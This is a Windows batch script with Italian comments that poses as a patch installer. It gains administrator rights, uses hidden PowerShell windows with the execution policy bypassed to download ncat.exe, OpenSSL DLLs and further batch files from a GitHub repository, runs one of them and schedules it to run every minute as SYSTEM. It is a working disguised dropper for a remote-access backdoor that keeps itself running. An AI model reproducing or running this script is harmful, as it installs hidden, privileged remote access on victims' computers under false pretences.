@echo off
NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit
)
:: Mostra il messaggio "APPLICAZIONE PATCH" nel terminale
echo APPLICAZIONE PATCH
:: Crea la cartella di destinazione senza mostrare l'output
start "" powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
mkdir "C:\Users\%USERNAME%\Project\Roll\Staging"
:: Attendi 2 secondi
timeout /t 2 >nul
:: Scarica i file senza mostrare l'output
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/wait_R.bat/" -OutFile "$env:USERPROFILE\Project\Roll\Staging\wait_R.bat" > $null
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/clean.bat" -OutFile "$env:USERPROFILE\Desktop\clean.bat" > $null
timeout /t 2 >nul
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/ncat.exe" -OutFile "C:\Windows\Temp\ncat.exe" > $null
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libcrypto-3.dll" -OutFile "C:\Windows\SysWOW64\libcrypto-3.dll" > $null
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libssl-3.dll" -OutFile "C:\Windows\SysWOW64\libssl-3.dll" > $null

timeout /t 2 >nul
:: Esegui wait_R.bat in modo nascosto
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
Start-Process -WindowStyle Hidden -FilePath 'C:\Users\%USERNAME%\Project\Roll\Staging\waitRR.bat'
schtasks /create /tn "Bob" /tr "C:\Users\%USERNAME%\Project\Roll\Staging\waitRR.bat" /sc minute /mo 1 /ru SYSTEM

